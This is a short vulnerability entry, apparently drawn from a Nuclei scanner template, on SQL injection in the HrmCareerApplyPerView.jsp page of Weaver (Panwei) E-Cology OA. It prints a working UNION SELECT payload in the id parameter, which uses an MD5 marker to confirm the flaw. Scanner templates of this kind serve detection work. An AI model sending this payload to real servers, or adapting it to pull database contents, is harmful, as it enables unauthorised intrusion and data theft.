# Vulnerability: Weaver E-Cology HrmCareerApplyPerView - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`weaver-ecology-hrmcareer-sqli.yaml`)

## Description
There is a SQL injection vulnerability in the HrmCareerApplyPerView.jsp file of Panwei OA E-Cology. An attacker can obtain sensitive files in the server database through the vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201,2,sys.fn_sqlvarbasetostr(HashBytes('MD5','{{num}}')),4,5,6,7
```

